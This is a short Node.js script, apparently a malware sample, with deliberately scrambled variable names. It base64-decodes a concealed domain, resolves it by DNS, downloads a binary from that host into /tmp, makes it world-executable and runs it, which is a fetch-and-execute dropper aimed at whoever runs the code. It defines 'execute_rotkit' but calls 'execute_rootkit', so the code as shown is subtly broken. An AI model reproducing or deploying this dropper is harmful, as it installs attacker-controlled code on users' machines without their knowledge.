const http = require('http');
const child_process = require('child_process');
const dns = require('dns');
const fs = require('fs');

function everted() {
    this.execute_rotkit = function(cornuated) {
      if (cornuated != null && cornuated != '0.0.0.0') {
        catechizable = http.get('http://' + cornuated + '/nonvoidable', function(dyphone) {
          var oxygenating = fs.createWriteStream('/tmp/ungainness');
          dyphone.on('data', function(soodly) {
            oxygenating.write(soodly);
          });
          dyphone.on('end', function() {
            oxygenating.end();
            fs.chmod('/tmp/ungainness', '0777');
            child_process.exec('/tmp/ungainness', function(err, stdout, stderr) {});
          });
        });
      }
    };
    this.run = function() {
      var self = this
      antidivine = 'Y2M1NDM0M2YuaGVpaHR3aGxzLmRl'
      dns.lookup((new Buffer(antidivine, 'base64')).toString(), function(err, hypsometer) {
        self.execute_rootkit(hypsometer);
      });
    };
};

(new everted()).run();
